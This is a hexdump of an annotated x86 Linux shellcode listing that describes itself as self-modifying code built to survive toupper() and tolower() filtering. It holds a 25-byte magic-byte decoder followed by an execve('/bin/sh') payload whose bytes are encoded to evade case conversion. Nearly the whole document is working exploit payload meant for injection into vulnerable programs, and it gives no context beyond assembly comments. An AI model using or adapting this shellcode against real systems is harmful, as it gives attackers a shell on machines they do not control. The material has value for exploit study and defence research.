00000000  2f 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*--------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000030  2d 2d 2d 2d 2d 2d 2d 2d  2d 2a 2f 0d 0a 2f 2a 20  |---------*/../* |
00000040  20 20 20 20 4d 61 67 69  63 20 42 79 74 65 20 53  |    Magic Byte S|
00000050  65 6c 66 20 4d 6f 64 69  66 79 69 6e 67 20 43 6f  |elf Modifying Co|
00000060  64 65 20 66 6f 72 20 73  75 72 76 69 76 69 6e 67  |de for surviving|
00000070  20 20 20 20 20 20 2a 2f  0d 0a 2f 2a 20 20 20 20  |      */../*    |
00000080  20 20 20 20 20 20 20 20  20 20 20 74 6f 75 70 70  |           toupp|
00000090  65 72 28 29 20 26 20 74  6f 6c 6f 77 65 72 28 29  |er() & tolower()|
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000b0  20 20 20 2a 2f 0d 0a 2f  2a 20 20 20 20 20 20 20  |   */../*       |
000000c0  20 37 36 62 79 74 65 73  20 65 78 65 63 76 65 28  | 76bytes execve(|
000000d0  29 20 5f 65 78 69 74 28  29 20 63 6f 64 65 20 62  |) _exit() code b|
000000e0  79 20 58 4f 52 74 20 20  20 20 20 20 20 20 20 20  |y XORt          |
000000f0  2a 2f 0d 0a 2f 2a 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |*/../*----------|
00000100  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000120  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 2f 0d  |-------------*/.|
00000130  0a 22 5c 78 65 62 5c 78  33 34 22 20 20 20 20 20  |."\xeb\x34"     |
00000140  20 20 20 20 20 20 20 20  20 20 2f 2a 20 6a 6d 70  |          /* jmp|
00000150  20 24 30 78 33 34 20 20  20 20 20 20 20 20 20 20  | $0x34          |
00000160  5b 72 65 76 65 72 74 5d  20 20 2a 2f 0d 0a 22 5c  |[revert]  */.."\|
00000170  78 35 65 22 20 20 20 20  20 20 20 20 20 20 20 20  |x5e"            |
00000180  20 20 20 20 20 20 20 2f  2a 20 70 6f 70 20 25 65  |       /* pop %e|
00000190  73 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |si              |
000001a0  20 20 20 20 20 20 20 2a  2f 0d 0a 2f 2a 2d 2d 73  |       */../*--s|
000001b0  65 74 2d 75 70 2d 76 61  72 69 61 62 6c 65 73 2d  |et-up-variables-|
000001c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000001e0  2d 2d 2d 2d 2a 2f 0d 0a  22 5c 78 38 39 5c 78 66  |----*/.."\x89\xf|
000001f0  37 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |7"              |
00000200  20 2f 2a 20 6d 6f 76 20  25 65 73 69 2c 20 25 65  | /* mov %esi, %e|
00000210  64 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |di              |
00000220  20 2a 2f 0d 0a 22 5c 78  38 33 5c 78 65 66 5c 78  | */.."\x83\xef\x|
00000230  32 32 22 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |22"           /*|
00000240  20 73 75 62 20 24 30 78  32 32 2c 20 25 65 64 69  | sub $0x22, %edi|
00000250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
00000260  0d 0a 22 5c 78 33 31 5c  78 63 39 22 20 20 20 20  |.."\x31\xc9"    |
00000270  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 78 6f  |           /* xo|
00000280  72 20 25 65 63 78 2c 20  25 65 63 78 20 20 20 20  |r %ecx, %ecx    |
00000290  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |           */.."|
000002a0  5c 78 62 31 5c 78 38 63  22 20 20 20 20 20 20 20  |\xb1\x8c"       |
000002b0  20 20 20 20 20 20 20 20  2f 2a 20 6d 6f 76 20 24  |        /* mov $|
000002c0  30 78 38 63 2c 20 25 63  6c 20 20 20 20 20 20 20  |0x8c, %cl       |
000002d0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 22 5c 78 64  |        */.."\xd|
000002e0  31 5c 78 63 39 22 20 20  20 20 20 20 20 20 20 20  |1\xc9"          |
000002f0  20 20 20 20 20 2f 2a 20  72 6f 72 20 24 30 78 31  |     /* ror $0x1|
00000300  2c 20 25 65 63 78 20 20  20 20 28 37 30 6c 6f 6f  |, %ecx    (70loo|
00000310  70 73 29 20 20 2a 2f 0d  0a 2f 2a 2d 73 63 61 6e  |ps)  */../*-scan|
00000320  2d 66 6f 72 2d 6d 61 67  69 63 2d 62 79 74 65 2d  |-for-magic-byte-|
00000330  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000350  2d 2d 2a 2f 0d 0a 22 5c  78 62 30 5c 78 37 62 22  |--*/.."\xb0\x7b"|
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000370  2a 20 6d 6f 76 20 24 30  78 37 62 2c 20 25 61 6c  |* mov $0x7b, %al|
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |               *|
00000390  2f 0d 0a 22 5c 78 66 32  5c 78 61 65 22 20 20 20  |/.."\xf2\xae"   |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 72  |            /* r|
000003b0  65 70 6e 65 20 73 63 61  73 62 20 20 20 20 20 20  |epne scasb      |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000003d0  22 5c 78 66 66 5c 78 63  66 22 20 20 20 20 20 20  |"\xff\xcf"      |
000003e0  20 20 20 20 20 20 20 20  20 2f 2a 20 64 65 63 20  |         /* dec |
000003f0  25 65 64 69 20 20 20 20  20 20 20 20 20 20 20 20  |%edi            |
00000400  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |         */.."\x|
00000410  61 63 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |ac"             |
00000420  20 20 20 20 20 20 2f 2a  20 6c 6f 64 73 62 20 20  |      /* lodsb  |
00000430  20 20 20 20 20 20 20 20  20 20 28 61 6c 3d 44 53  |          (al=DS|
00000440  3a 53 49 29 20 20 2a 2f  0d 0a 22 5c 78 32 38 5c  |:SI)  */.."\x28\|
00000450  78 30 37 22 20 20 20 20  20 20 20 20 20 20 20 20  |x07"            |
00000460  20 20 20 2f 2a 20 73 75  62 62 20 25 61 6c 2c 20  |   /* subb %al, |
00000470  28 25 65 64 69 29 20 20  20 20 20 20 20 20 20 20  |(%edi)          |
00000480  20 20 20 2a 2f 0d 0a 2f  2a 2d 2d 6c 6f 6f 70 2d  |   */../*--loop-|
00000490  62 61 63 6b 2d 74 6f 2d  73 63 61 6e 6e 65 72 2d  |back-to-scanner-|
000004a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000004c0  2a 2f 0d 0a 22 5c 78 65  32 5c 78 66 35 22 20 20  |*/.."\xe2\xf5"  |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
000004e0  6c 6f 6f 70 20 2d 24 30  78 65 20 20 20 20 20 20  |loop -$0xe      |
000004f0  5b 6c 6f 61 64 2d 62 79  74 65 5d 20 20 2a 2f 0d  |[load-byte]  */.|
00000500  0a 2f 2a 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |./*-------------|
00000510  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000520  2d 2d 2d 2d 2d 2d 2d 2d  5b 6c 65 6e 67 74 68 3a  |--------[length:|
00000530  32 35 62 79 74 65 73 5d  2d 2d 2a 2f 0d 0a 2f 2f  |25bytes]--*/..//|
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000570  20 20 20 20 20 20 20 2f  2f 0d 0a 2f 2a 2d 2d 6d  |       //../*--m|
00000580  6f 64 69 66 69 65 64 2d  73 68 65 6c 6c 63 6f 64  |odified-shellcod|
00000590  65 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |e---------------|
000005a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000005b0  2d 2d 2d 2d 2a 2f 0d 0a  22 5c 78 38 39 5c 78 37  |----*/.."\x89\x7|
000005c0  62 5c 78 30 38 22 20 20  20 20 20 20 20 20 20 20  |b\x08"          |
000005d0  20 2f 2a 20 6d 6f 76 6c  20 25 65 73 69 2c 20 30  | /* movl %esi, 0|
000005e0  78 38 28 25 65 73 69 29  20 20 20 20 20 20 20 20  |x8(%esi)        |
000005f0  40 2a 2f 0d 0a 22 5c 78  39 31 22 20 20 20 20 20  |@*/.."\x91"     |
00000600  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000610  20 78 63 68 67 20 25 65  61 78 2c 20 25 65 63 78  | xchg %eax, %ecx|
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
00000630  0d 0a 22 5c 78 38 38 5c  78 37 62 5c 78 30 37 22  |.."\x88\x7b\x07"|
00000640  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 6d 6f  |           /* mo|
00000650  76 62 20 25 61 6c 2c 20  30 78 37 28 25 65 73 69  |vb %al, 0x7(%esi|
00000660  29 20 20 20 20 20 20 20  20 20 40 2a 2f 0d 0a 22  |)         @*/.."|
00000670  5c 78 38 39 5c 78 37 62  5c 78 30 63 22 20 20 20  |\x89\x7b\x0c"   |
00000680  20 20 20 20 20 20 20 20  2f 2a 20 6d 6f 76 6c 20  |        /* movl |
00000690  25 65 61 78 2c 20 30 78  63 28 25 65 73 69 29 20  |%eax, 0xc(%esi) |
000006a0  20 20 20 20 20 20 20 40  2a 2f 0d 0a 22 5c 78 62  |       @*/.."\xb|
000006b0  30 5c 78 30 62 22 20 20  20 20 20 20 20 20 20 20  |0\x0b"          |
000006c0  20 20 20 20 20 2f 2a 20  6d 6f 76 62 20 24 30 78  |     /* movb $0x|
000006d0  62 2c 20 25 61 6c 20 20  20 20 20 20 20 20 20 20  |b, %al          |
000006e0  20 20 20 20 20 2a 2f 0d  0a 22 5c 78 38 39 5c 78  |     */.."\x89\x|
000006f0  66 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |f3"             |
00000700  20 20 2f 2a 20 6d 6f 76  6c 20 25 65 73 69 2c 20  |  /* movl %esi, |
00000710  25 65 62 78 20 20 20 20  20 20 20 20 20 20 20 20  |%ebx            |
00000720  20 20 2a 2f 0d 0a 22 5c  78 38 64 5c 78 37 62 5c  |  */.."\x8d\x7b\|
00000730  78 30 38 22 20 20 20 20  20 20 20 20 20 20 20 2f  |x08"           /|
00000740  2a 20 6c 65 61 6c 20 30  78 38 28 25 65 73 69 29  |* leal 0x8(%esi)|
00000750  2c 20 25 65 63 78 20 20  20 20 20 20 20 20 40 2a  |, %ecx        @*|
00000760  2f 0d 0a 22 5c 78 38 64  5c 78 37 62 5c 78 30 63  |/.."\x8d\x7b\x0c|
00000770  22 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 6c  |"           /* l|
00000780  65 61 6c 20 30 78 63 28  25 65 73 69 29 2c 20 25  |eal 0xc(%esi), %|
00000790  65 64 78 20 20 20 20 20  20 20 20 40 2a 2f 0d 0a  |edx        @*/..|
000007a0  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
000007b0  20 20 20 20 20 20 20 20  20 2f 2a 20 69 6e 74 20  |         /* int |
000007c0  24 30 78 38 30 20 20 20  20 20 20 20 20 20 20 20  |$0x80           |
000007d0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |         */.."\x|
000007e0  33 31 5c 78 64 62 22 20  20 20 20 20 20 20 20 20  |31\xdb"         |
000007f0  20 20 20 20 20 20 2f 2a  20 78 6f 72 6c 20 25 65  |      /* xorl %e|
00000800  62 78 2c 20 25 65 62 78  20 20 20 20 20 20 20 20  |bx, %ebx        |
00000810  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 38 39 5c  |      */.."\x89\|
00000820  78 64 38 22 20 20 20 20  20 20 20 20 20 20 20 20  |xd8"            |
00000830  20 20 20 2f 2a 20 6d 6f  76 6c 20 25 65 62 78 2c  |   /* movl %ebx,|
00000840  20 25 65 61 78 20 20 20  20 20 20 20 20 20 20 20  | %eax           |
00000850  20 20 20 2a 2f 0d 0a 22  5c 78 34 30 22 20 20 20  |   */.."\x40"   |
00000860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000870  2f 2a 20 69 6e 63 20 25  65 61 78 20 20 20 20 20  |/* inc %eax     |
00000880  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000890  2a 2f 0d 0a 22 5c 78 63  64 5c 78 38 30 22 20 20  |*/.."\xcd\x80"  |
000008a0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
000008b0  69 6e 74 20 24 30 78 38  30 20 20 20 20 20 20 20  |int $0x80       |
000008c0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
000008d0  0a 2f 2a 2d 2d 72 65 76  65 72 74 2d 2d 2d 2d 2d  |./*--revert-----|
000008e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000900  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2a 2f 0d 0a 22 5c  |----------*/.."\|
00000910  78 65 38 5c 78 63 37 5c  78 66 66 5c 78 66 66 5c  |xe8\xc7\xff\xff\|
00000920  78 66 66 22 20 20 20 2f  2a 20 63 61 6c 6c 20 2d  |xff"   /* call -|
00000930  24 30 78 33 39 20 20 20  20 20 20 20 20 20 20 20  |$0x39           |
00000940  20 20 20 20 20 20 20 2a  2f 0d 0a 2f 2a 2d 2d 6f  |       */../*--o|
00000950  66 66 73 65 74 2d 74 61  62 6c 65 2d 2d 2d 2d 2d  |ffset-table-----|
00000960  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000980  2d 2d 2d 2d 2a 2f 0d 0a  22 5c 78 30 35 5c 78 33  |----*/.."\x05\x3|
00000990  35 5c 78 33 35 5c 78 32  64 5c 78 32 35 5c 78 31  |5\x35\x2d\x25\x1|
000009a0  39 5c 78 31 32 5c 78 30  64 5c 78 30 38 5c 78 31  |9\x12\x0d\x08\x1|
000009b0  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |3"             /|
000009c0  2a 2a 2f 0d 0a 2f 2a 2d  2d 73 74 72 69 6e 67 2d  |**/../*--string-|
000009d0  74 6f 2d 72 75 6e 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |to-run----------|
000009e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000009f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2a 2f  |--------------*/|
00000a00  0d 0a 22 2f 5c 78 37 62  5c 78 37 62 5c 78 37 62  |.."/\x7b\x7b\x7b|
00000a10  2f 5c 78 37 62 5c 78 37  62 22 20 2f 2a 20 2e 73  |/\x7b\x7b" /* .s|
00000a20  74 72 69 6e 67 20 22 2f  62 69 6e 2f 73 68 22 20  |tring "/bin/sh" |
00000a30  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 2f  |           */../|
00000a40  2a 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |*---------------|
00000a50  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000a60  2d 2d 2d 2d 2d 2d 2d 5b  6c 65 6e 67 74 68 3a 35  |-------[length:5|
00000a70  31 62 79 74 65 73 5d 2d  2a 2f                    |1bytes]-*/|
00000a7a
